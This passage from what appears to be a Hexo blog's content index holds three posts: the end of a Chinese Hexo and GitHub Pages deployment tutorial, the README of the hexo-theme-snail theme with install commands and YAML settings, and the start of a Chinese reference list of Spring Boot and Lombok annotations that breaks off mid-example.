内容，那么每次新建一篇文章时都会包含这个修改。</li><li>source<br>资源文件夹是存放用户资源的地方。除 <em>posts 文件夹之外，开头命名为 </em> (下划线)的文件 / 文件夹和隐藏的文件将会被忽略。Markdown 和 HTML 文件会被解析并放到 public 文件夹，而其他文件会被拷贝过去。</li><li>themes<br>主题 文件夹。Hexo 会根据主题来生成静态页面。  </li></ul><h3 id="网站配置与基础指令"><a href="#网站配置与基础指令" class="headerlink" title="网站配置与基础指令"></a>网站配置与基础指令</h3><ul><li>config文件中记录网站参数 相关参数介绍<a href="https://hexo.io/zh-cn/docs/configuration" target="_blank" rel="noopener">Hexo官方文档</a></li><li>基础指令：<br><strong>new</strong><br>新建一篇文章。如果没有设置 layout 的话，默认使用 _config.yml 中的 default_layout 参数代替。如果标题包含空格的话，请使用引号括起来<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new [layout] &lt;title&gt;</span><br></pre></td></tr></table></figure>-<br><strong>generate</strong><br>生成静态文件。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure></li></ul><p><strong>server</strong><br>启动服务器。可简写为hexo s,默认情况下，访问网址为： <a href="http://localhost:4000/。" target="_blank" rel="noopener">http://localhost:4000/。</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure></p><p><strong>clean</strong><br>清除缓存文件 (db.json) 和已生成的静态文件 (public)。<br>在某些情况（尤其是更换主题后），如果发现您对站点的更改无论如何也不生效，您可能需要运行该命令。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo clean</span><br></pre></td></tr></table></figure></p><h2 id="写作"><a href="#写作" class="headerlink" title="写作"></a>写作</h2><p>文件夹进入指令new新建的.md文件，使用文本编辑器编译，个人推荐Sublime Text 3。进入后基于markdown语法进行写作。Hexo官方文档也有写作方法。完成博客编写后可在命令行输入<br>hexo s进入<a href="http://localhost:4000/页面查看编写结果。" target="_blank" rel="noopener">http://localhost:4000/页面查看编写结果。</a>    </p><h3 id="hexo主题选择"><a href="#hexo主题选择" class="headerlink" title="hexo主题选择"></a>hexo主题选择</h3><p><a href="https://hexo.io/themes/" target="_blank" rel="noopener">Hexo主题选择界面</a>找到心仪的主题后，查找该主题的文档按要求进行操作,亦可留言作者求助。  </p><h2 id="部署到个人网站"><a href="#部署到个人网站" class="headerlink" title="部署到个人网站"></a>部署到个人网站</h2><p>这里建议并演示Github仓库Gitpage功能搭建。</p><h3 id="github仓库管理"><a href="#github仓库管理" class="headerlink" title="github仓库管理"></a>github仓库管理</h3><p>1、新建仓库，于个人主页面如图位置创建新的远程仓库<br><img src="/img/newrepository.PNG" alt="New Repository alt"></p><p>2、仓库命名，按下图要求命名(github.io前与左侧owner名一致，github.io不可改)<br><img src="/img/rename.PNG" alt="Repository Name alt"></p><p>3、填写完后点击页面最下面的create按钮，于下图位置点击复制按钮<br><img src="/img/copy.PNG" alt="https/ssh alt"></p><p>4、黏贴复制的内容，修改_config.yml文件下图位置的配置(不同主题可能有些许小不同但命名基本相同),修改url、root、type、branch、github这几处。<br><img src="/img/deploy.PNG" alt="deploy alt"><br><img src="/img/url.PNG" alt="url alt"></p><p>5、进入本地博客文件夹git bash,安装 hexo-deployer-git 输入npm install hexo-deployer-git —save安装完成后依次输入hexo g(生成静态文件)、hexo d(部署到服务器)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-deployer-git --save</span><br><span class="line"></span><br><span class="line">一般流程：</span><br><span class="line">hexo g 生成静态资源</span><br><span class="line">hexo d 部署</span><br><span class="line">hexo clean 清除静态缓存</span><br><span class="line">hexo s启动服务</span><br></pre></td></tr></table></figure><p>完成上述操作后可在地址 ownername.github.io 查看页面效果</p><h3 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h3><p>若想部署到自己的域名则按下列操作<br>1、ping获取github上部署的博客页面ip地址<br><img src="/img/ping.PNG" alt="ping alt"></p><p>2、github仓库设置(save前为自己的域名地址,不要留https://)<br>在你的博客仓库找到如图所示位置进行设置<br><img src="/img/Settings.PNG" alt="Setting alt"><br><img src="/img/save.PNG" alt="Save alt"></p><p>3、服务器控制台解析,按下图配置即可，ip地址为第一步ping的地址<br><img src="/img/解析.PNG" alt="解析 alt"><br>完成后去自己的域名看看把~</p>]]></content>
      
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo-Theme-Snail</title>
      <link href="/2019/11/01/Hexo-Theme-Snail/"/>
      <url>/2019/11/01/Hexo-Theme-Snail/</url>
      
        <content type="html"><![CDATA[<h1 id="hexo-theme-snail"><a href="#hexo-theme-snail" class="headerlink" title="hexo-theme-snail"></a>hexo-theme-snail</h1><p><a href="https://github.com/dusign/hexo-theme-snail" target="_blank" rel="noopener">View Hexo-Theme-Snail Sources On Github &#10174; </a></p><p><a href="https://www.dusign.net" target="_blank" rel="noopener">View Live Super Snail Blog &#10174;</a></p><p><img src="snail.png" alt="hexo-theme-snail"></p><p>Hexo-theme-snail is a succinct hexo theme. It has two colors, light and star, that can be set according to your own preferences in the settings, and also has the functions of sharing and commenting. More features are under development.</p><h2 id="Features"><a href="#Features" class="headerlink" title="Features"></a>Features</h2><ul><li>light color theme and star theme</li><li>diversified comment system</li><li>notice tips</li><li>share to other platforms (under development)</li><li>picture sharing (under development)</li></ul><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Install-Hexo"><a href="#Install-Hexo" class="headerlink" title="Install Hexo"></a>Install Hexo</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-cli -g</span><br></pre></td></tr></table></figure><h3 id="Setup-your-blog"><a href="#Setup-your-blog" class="headerlink" title="Setup your blog"></a>Setup your blog</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo init blog</span><br></pre></td></tr></table></figure><h3 id="Installation-Theme"><a href="#Installation-Theme" class="headerlink" title="Installation Theme"></a>Installation Theme</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> blog</span><br><span class="line">$ rm -rf <span class="built_in">source</span></span><br><span class="line">$ rm _config.yml package.json README.md LICENSE</span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/dusign/hexo-theme-snail.git</span><br><span class="line">$ mv ./hexo-theme-snail/snail ./themes</span><br><span class="line">$ mv ./hexo-theme-snail/* ./</span><br><span class="line">$ npm install</span><br></pre></td></tr></table></figure><h3 id="Set-Theme"><a href="#Set-Theme" class="headerlink" title="Set Theme"></a>Set Theme</h3><p>Modify the value of <code>theme:</code> in <code>_config.yml</code><br><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Extensions</span></span><br><span class="line"><span class="comment">## Plugins: https://hexo.io/plugins/</span></span><br><span class="line"><span class="comment">## Themes: https://hexo.io/themes/</span></span><br><span class="line"><span class="attr">theme:</span> <span class="string">snail</span></span><br></pre></td></tr></table></figure></p><h3 id="Start-the-Server"><a href="#Start-the-Server" class="headerlink" title="Start the Server"></a>Start the Server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><h2 id="Configuration"><a href="#Configuration" class="headerlink" title="Configuration"></a>Configuration</h2><h3 id="Site"><a href="#Site" class="headerlink" title="Site"></a>Site</h3><p>Replace the following information with your own.<br><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Site</span></span><br><span class="line"><span class="attr">title:</span> </span><br><span class="line"><span class="attr">subtitle:</span> <span class="string">At</span> <span class="string">the</span> <span class="string">bottom</span> <span class="string">of</span> <span class="string">the</span> <span class="string">well,</span> <span class="string">it</span> <span class="string">is</span> <span class="string">destined</span> <span class="string">to</span> <span class="string">see</span> <span class="string">only</span> <span class="string">the</span> <span class="string">sky</span> <span class="string">at</span> <span class="string">the</span> <span class="string">wellhead.</span> </span><br><span class="line">          <span class="string">However,</span> <span class="string">the</span> <span class="string">starting</span> <span class="string">point</span> <span class="string">only</span> <span class="string">affects</span> <span class="string">the</span> <span class="string">process</span> <span class="string">of</span> <span class="string">reaching</span> <span class="string">your</span> <span class="string">peak</span> <span class="string">and</span> <span class="string">does</span> <span class="string">not</span> <span class="string">determine</span> <span class="string">the</span> <span class="string">height</span> <span class="string">you</span> <span class="string">reach.</span></span><br><span class="line"><span class="attr">author:</span> <span class="string">Dusign</span></span><br><span class="line"><span class="attr">language:</span> <span class="string">en</span></span><br><span class="line"><span class="attr">timezone:</span></span><br></pre></td></tr></table></figure></p><h3 id="Site-Settings"><a href="#Site-Settings" class="headerlink" title="Site Settings"></a>Site Settings</h3><p>Put customized pictures in <code>img</code> directory.<br><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Site settings</span></span><br><span class="line"><span class="attr">SEOTitle:</span> <span class="string">Hexo-theme-snail</span></span><br><span class="line"><span class="attr">email:</span> <span class="string">hexo-theme-snail@mail.com</span></span><br><span class="line"><span class="attr">description:</span> <span class="string">"A hexo theme"</span></span><br><span class="line"><span class="attr">keyword:</span> <span class="string">"dusign, hexo-theme-snail"</span></span><br><span class="line"><span class="attr">header-img:</span> <span class="string">img/header_img/home-bg-1-dark.jpg</span></span><br><span class="line"><span class="attr">signature:</span> <span class="literal">true</span> <span class="comment">#show signature</span></span><br><span class="line"><span class="attr">signature-img:</span> <span class="string">img/signature/Just-do-it-white.png</span></span><br></pre></td></tr></table></figure></p><h3 id="SNS-Settings"><a href="#SNS-Settings" class="headerlink" title="SNS Settings"></a>SNS Settings</h3><p>If you don’t want to display it, you can delete it directly.<br><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># SNS settings</span></span><br><span class="line"><span class="attr">github_username:</span>    <span class="string">dusign</span></span><br><span class="line"><span class="attr">twitter_username:</span>   <span class="string">dusignr</span></span><br><span class="line"><span class="attr">facebook_username:</span>  <span class="string">Gang</span> <span class="string">Du</span></span><br><span class="line"><span class="attr">zhihu_username:</span> <span class="string">dusignr</span></span><br></pre></td></tr></table></figure></p><h3 id="Sidebar-Settings"><a href="#Sidebar-Settings" class="headerlink" title="Sidebar Settings"></a>Sidebar Settings</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sidebar Settings</span></span><br><span class="line"><span class="attr">sidebar:</span> <span class="literal">true</span>                      <span class="comment"># whether or not using Sidebar.</span></span><br><span class="line"><span class="attr">sidebar-about-description:</span> <span class="string">"Welcome to visit, I'm Dusign!"</span></span><br><span class="line"><span class="attr">sidebar-avatar:</span> <span class="string">img/ironman-draw.png</span>      <span class="comment"># use absolute URL, seeing it's used in both `/` and `/about/`</span></span><br><span class="line"><span class="attr">widgets:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">featured-tags</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">short-about</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">recent-posts</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">friends-blog</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">archive</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">category</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># widget behavior</span></span><br><span class="line"><span class="comment">## Archive</span></span><br><span class="line"><span class="attr">archive_type:</span> <span class="string">'monthly'</span></span><br><span class="line"><span class="attr">show_count:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## Featured Tags</span></span><br><span class="line"><span class="attr">featured-tags:</span> <span class="literal">true</span>                     <span class="comment"># whether or not using Feature-Tags</span></span><br><span class="line"><span class="attr">featured-condition-size:</span> <span class="number">1</span>              <span class="comment"># A tag will be featured if the size of it is more than this condition value</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## Friends</span></span><br><span class="line"><span class="attr">friends:</span> <span class="string">[</span></span><br><span class="line">    <span class="string">&#123;</span></span><br><span class="line">        <span class="attr">title:</span> <span class="string">"Dusign's Blog"</span><span class="string">,</span></span><br><span class="line">        <span class="attr">href:</span> <span class="string">"https://blog.csdn.net/d_Nail"</span></span><br><span class="line">    <span class="string">&#125;,&#123;</span></span><br><span class="line">        <span class="attr">title:</span> <span class="string">"Dusign's Web"</span><span class="string">,</span></span><br><span class="line">        <span class="attr">href:</span> <span class="string">"#"</span></span><br><span class="line">    <span class="string">&#125;,&#123;</span></span><br><span class="line">        <span class="attr">title:</span> <span class="string">"Dusign's Github"</span><span class="string">,</span></span><br><span class="line">        <span class="attr">href:</span> <span class="string">"https://github.com/dusign"</span></span><br><span class="line">    <span class="string">&#125;,&#123;</span></span><br><span class="line">        <span class="attr">title:</span> <span class="string">"Other"</span><span class="string">,</span></span><br><span class="line">        <span class="attr">href:</span> <span class="string">"#"</span></span><br><span class="line">    <span class="string">&#125;</span></span><br><span class="line"><span class="string">]</span></span><br></pre></td></tr></table></figure><h3 id="Theme"><a href="#Theme" class="headerlink" title="Theme"></a>Theme</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Extensions</span></span><br><span class="line"><span class="comment">## Plugins: https://hexo.io/plugins/</span></span><br><span class="line"><span class="comment">## Themes: https://hexo.io/themes/</span></span><br><span class="line"><span class="attr">theme:</span> <span class="string">snail</span></span><br></pre></td></tr></table></figure><h3 id="Deployment"><a href="#Deployment" class="headerlink" title="Deployment"></a>Deployment</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/deployment.html</span></span><br><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span></span><br><span class="line">      <span class="attr">github:</span> <span class="string">github.repository.address</span></span><br><span class="line">      <span class="attr">coding:</span> <span class="string">coding.repository.address</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure><h3 id="Comment"><a href="#Comment" class="headerlink" title="Comment"></a>Comment</h3><p>See httpymls://github.com/imsun/gitment for detailed configuration method.<br><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Comment</span></span><br><span class="line"><span class="comment">## This comment system is gitment</span></span><br><span class="line"><span class="comment">## gitment url: https://github.com/imsun/gitment</span></span><br><span class="line"><span class="attr">comment:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">owner:</span></span><br><span class="line">  <span class="attr">repo:</span></span><br><span class="line">  <span class="attr">client_id:</span></span><br><span class="line">  <span class="attr">client_secret:</span></span><br></pre></td></tr></table></figure></p><h3 id="Tip"><a href="#Tip" class="headerlink" title="Tip"></a>Tip</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Tip</span></span><br><span class="line"><span class="attr">tip:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">content:</span> <span class="string">欢迎访问</span> <span class="string">&lt;a</span> <span class="string">href="https://www.dusign.net"</span> <span class="string">target="dusign"&gt;dusign&lt;/a&gt;</span> <span class="string">的博客，博客系统一键分享的功能还在完善中，请大家耐心等待。</span></span><br><span class="line">          <span class="string">若有问题或者有好的建议欢迎留言，笔者看到之后会及时回复。</span></span><br><span class="line">          <span class="string">评论点赞需要github账号登录，如果没有账号的话请点击</span> </span><br><span class="line">          <span class="string">&lt;a</span> <span class="string">href="https://github.com"</span> <span class="string">target="view_window"</span> <span class="string">&gt;</span> <span class="string">github</span> <span class="string">&lt;/a&gt;</span> <span class="string">注册，</span> <span class="string">谢谢</span> <span class="string">!</span></span><br></pre></td></tr></table></figure><h3 id="Color-Sheme"><a href="#Color-Sheme" class="headerlink" title="Color Sheme"></a>Color Sheme</h3><p>Set the <code>enable</code> value of the desired color sheme to <code>true</code>. If the value of <code>bg_effects.star.enable</code> is <code>true</code>, please modify the value of <code>highlight_theme</code> in <code>./themes/snail/_config.yml</code> to <code>night</code>.<br><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Color Sheme</span></span><br><span class="line"><span class="comment">## If there is no effect after modification, please empty the cache and try again.</span></span><br><span class="line"><span class="comment">## ⚠️ The following special effects will take up a lot of cpu resorces, please open it carefully.</span></span><br><span class="line"><span class="attr">bg_effects:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">line:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">color:</span> <span class="number">129</span><span class="string">,200,61</span></span><br><span class="line">    <span class="attr">pointColor:</span> <span class="number">129</span><span class="string">,200,61</span></span><br><span class="line">    <span class="attr">opacity:</span> <span class="number">0.7</span></span><br><span class="line">    <span class="attr">zIndex:</span> <span class="number">-9</span></span><br><span class="line">    <span class="attr">count:</span> <span class="number">99</span></span><br><span class="line">  <span class="attr">mouse_click:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">content:</span> <span class="string">'"🌱","just do it","🌾","🍀","don'</span><span class="string">'t give up","🍂","🌻","try it again","🍃","never say die","🌵","🌿","🌴"'</span></span><br><span class="line">    <span class="attr">color:</span> <span class="string">'"rgb(121,93,179)"</span></span><br><span class="line"><span class="string">          ,"rgb(76,180,231)"</span></span><br><span class="line"><span class="string">          ,"rgb(184,90,154)"</span></span><br><span class="line"><span class="string">          ,"rgb(157,211,250)"</span></span><br><span class="line"><span class="string">          ,"rgb(255,0,0)"</span></span><br><span class="line"><span class="string">          ,"rgb(242,153,29)"</span></span><br><span class="line"><span class="string">          ,"rgb(23,204,16)"</span></span><br><span class="line"><span class="string">          ,"rgb(222,0,0)"</span></span><br><span class="line"><span class="string">          ,"rgb(22,36,92)"</span></span><br><span class="line"><span class="string">          ,"rgb(127,24,116)"</span></span><br><span class="line"><span class="string">          ,"rgb(119,195,79)"</span></span><br><span class="line"><span class="string">          ,"rgb(4,77,34)"</span></span><br><span class="line"><span class="string">          ,"rgb(122,2,60)"'</span></span><br><span class="line">  <span class="attr">star:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure></p><h2 id="Releases"><a href="#Releases" class="headerlink" title="Releases"></a>Releases</h2><p>V1.0</p><ul><li>fix the bugs</li><li>add comment system</li><li>add notice tips</li><li>add star sheme</li></ul><h2 id="License"><a href="#License" class="headerlink" title="License"></a>License</h2><p>Apache License 2.0 Copyright(c) 2018-2020 <a href="https://github.com/dusign" target="_blank" rel="noopener">Dusign</a>   </p><p><a href="https://github.com/dusign/hexo-theme-snail" target="_blank" rel="noopener">hexo-theme-snail</a> is derived from <a href="https://github.com/Huxpro/huxpro.github.io" target="_blank" rel="noopener">Huxpro</a> Apache License 2.0. Copyright (c) 2015-2020 Huxpro</p>]]></content>
      
      
      <categories>
          
          <category> hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo-theme-snail </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>springboot注解代码Annotation整合</title>
      <link href="/2019/10/01/Annotation/"/>
      <url>/2019/10/01/Annotation/</url>
      
        <content type="html"><![CDATA[<p>常见注解代码集合，方便以后查阅，后续持续更新。</p><h2 id="Annotation简介"><a href="#Annotation简介" class="headerlink" title="Annotation简介"></a>Annotation简介</h2><ul><li><p>从Java1.5开始，Java增加了元数据（MetaData）的支持，也就是Annotation（注释）；</p></li><li><p>Annotation能被用来为程序元素（类、方法、成员变量等）设置元数据；</p></li><li><p>Annotation不能影响程序代码的执行，无论添加、删除Annotation，代码始终如一的执行；</p></li><li><p>如果希望让程序中的Annotataion能在 运行时其一定作用，只有通过某种配套的工具对Annotation中的信息进行访问和处理，这些工具统称APT（Annotion Processing Tool）； </p></li></ul><h2 id="Annotation基本注解"><a href="#Annotation基本注解" class="headerlink" title="Annotation基本注解"></a>Annotation基本注解</h2><ul><li><p>@Override：限定重写父类方法,验证@Override下面的方法名是否是你父类中所有的，如果没有则报错，避免方法名错误。</p></li><li><p>@Deprecated：标记已过时,用于标识某个程序元素（类、方法等）已过时，当其他程序使用已过时的类、方法时，编译器将会给出警告。该方法不可再调用。</p></li><li><p>@SuppressWarnings：抑制编译器警告,指示被Annotation标识的程序元素（以及在该程序元素中的所有字元素）取消显示指定的编译器警告；一直作用于该程序元素的所有子元素；</p></li></ul><h2 id="lombok基本注解"><a href="#lombok基本注解" class="headerlink" title="lombok基本注解"></a>lombok基本注解</h2><ul><li><p>@Data:使用这个注解，就不用再去手写Getter,Setter,equals,canEqual,hasCode,toString等方法了，注解后在编译时会自动加进去。</p></li><li><p>@AllArgsConstructor:使用后添加一个构造函数，该构造函数含有所有已声明字段属性参数。</p></li><li><p>@NoArgsConstructor:使用后创建一个无参构造函数。</p></li><li><p>@Builder:解决某个类有很多构造函数的情况，省去写很多构造函数的麻烦。用一个内部类去实例化一个对象，避免一个类出现过多构造函数。</p></li><li><p>@NonNull：注解在属性上，如果注解了，就必须不能为Null。</p></li><li><p>@toString:生成toString方法，默认情况下，会输出类名、所有属性，属性会按照顺序输出，以逗号分割。</p></li></ul><h2 id="注解-annotations-列表"><a href="#注解-annotations-列表" class="headerlink" title="注解(annotations)列表"></a>注解(annotations)列表</h2><ul><li><p>@SpringBootApplication：包含了@ComponentScan、@Configuration和@EnableAutoConfiguration注解。其中@ComponentScan让spring Boot扫描到Configuration类并把它加入到程序上下文。</p></li><li><p>@Configuration 等同于spring的XML配置文件；使用Java代码可以检查类型安全。</p></li><li><p>@EnableAutoConfiguration 自动配置。</p></li><li><p>@ComponentScan 组件扫描，可自动发现和装配一些Bean。</p></li><li><p>@Component可配合CommandLineRunner使用，在程序启动后执行一些基础任务。</p></li><li><p>@RestController注解是@Controller和@ResponseBody的合集,表示这是个控制器bean,并且是将函数的返回值直 接填入HTTP响应体中,是REST风格的控制器。</p></li><li><p>@Autowired自动导入。</p></li><li><p>@PathVariable获取参数。</p></li><li><p>@JsonBackReference解决嵌套外链问题。</p></li><li><p>@RepositoryRestResourcepublic配合spring-boot-starter-data-rest使用。</p></li></ul><h2 id="注解-annotations-详解-SpringBootApplication："><a href="#注解-annotations-详解-SpringBootApplication：" class="headerlink" title="注解(annotations)详解@SpringBootApplication："></a>注解(annotations)详解@SpringBootApplication：</h2><ul><li><p>@SpringBootApplication：申明让spring boot自动给程序进行必要的配置，这个配置等同于：@Configuration ，@EnableAutoConfiguration 和 @ComponentScan 三个配置。</p></li><li><p>@ResponseBody：表示该方法的返回结果直接写入HTTP response body中，一般在异步获取数据时使用，用于构建RESTful的api。在使用@RequestMapping后，返回值通常解析为跳转路径，加上@esponsebody后返回结果不会被解析为跳转路径，而是直接写入HTTP response body中。比如异步获取json数据，加上@Responsebody后，会直接返回json数据。该注解一般会配合@RequestMapping一起使用。</p></li><li><p>@Controller：用于定义控制器类对Controller实现类进行标注，在spring项目中由控制器负责将用户发来的URL请求转发到对应的服务接口（service层），一般这个注解在类中，通常方法需要配合注解@RequestMapping。</p></li><li><p>@RestController：用于标注控制层组件(如struts中的action)，@ResponseBody和@Controller的合集。</p></li><li><p>@RequestMapping：提供路由信息，负责URL到Controller中的具体函数的映射<br>@GetMapping：是@RequestMapping(method = RequestMethod.GET)的缩写。该注解将HTTP Get 映射到 特定的处理方法上。大白话即：根据HTTP地址映射调用Controller对应方法<br>@PostMapping:向服务器提交信息,即客户端信息返回给服务器端。<br>@PutMapping：作用与@PostMapping类似，用@PutMapping倾向于更新信息。<br>@DeleteMapping： 删除URL映射</p></li><li><p>@EnableAutoConfiguration：SpringBoot自动配置（auto-configuration）：尝试根据你添加的jar依赖自动配置你的Spring应用。例如，如果你的classpath下存在HSQLDB，并且你没有手动配置任何数据库连接beans，那么我们将自动配置一个内存型（in-memory）数据库”。你可以将@EnableAutoConfiguration或者@SpringBootApplication注解添加到一个@Configuration类上来选择自动配置。如果发现应用了你不想要的特定自动配置类，你可以使用@EnableAutoConfiguration注解的排除属性来禁用它们。</p></li><li><p>@ComponentScan：其实很简单，@ComponentScan主要就是定义扫描的路径从中找出标识了需要装配的类自动装配到spring的bean容器中,你一定都有用过@Controller，@Service，@Repository注解，查看其源码你会发现，他们中有一个共同的注解@Component，没错@ComponentScan注解默认就会装配标识了@Controller，@Service，@Repository，@Component注解的类到spring容器中。当然，这个的前提就是你需要在所扫描包下的类上引入注解。</p></li><li><p>@Configuration：相当于传统的xml配置文件，如果有些第三方库需要用到xml文件，建议仍然通过@Configuration类作为项目的配置主类——可以使用@ImportResource注解加载xml配置文件。</p></li><li><p>@Import：用来导入其他配置类。</p></li><li><p>@ImportResource：用来加载xml配置文件。</p></li><li><p>@Autowired：自动导入依赖的bean,byType方式。把配置好的Bean拿来用，完成属性、方法的组装，它可以对类成员变量、方法及构造函数进行标注，完成自动装配的工作。当加上（required=false）时，就算找不到bean也不报错。</p></li><li><p>@Service：一般用于修饰service层的组件用于对Service实现类进行标注,（注入dao）用于标注服务层，主要用来进行业务的逻辑处理.</p></li><li><p>@Repository：使用@Repository注解可以确保DAO或者repositories提供异常转译实现dao访问，这个注解修饰的DAO或者repositories类会被ComponetScan发现并配置，同时也不需要为它们提供XML配置项,用于对DAO实现类进行标注。</p></li><li><p>@Bean：用@Bean标注方法等价于XML中配置的bean,相当于XML中的,放在方法的上面，而不是类，意思是产生一个bean,并交给spring管理。</p></li><li><p>@Value：注入Spring boot application.properties配置的属性的值。示例代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@Value(value = “<span class="comment">#&#123;message&#125;”)</span></span><br><span class="line">private String 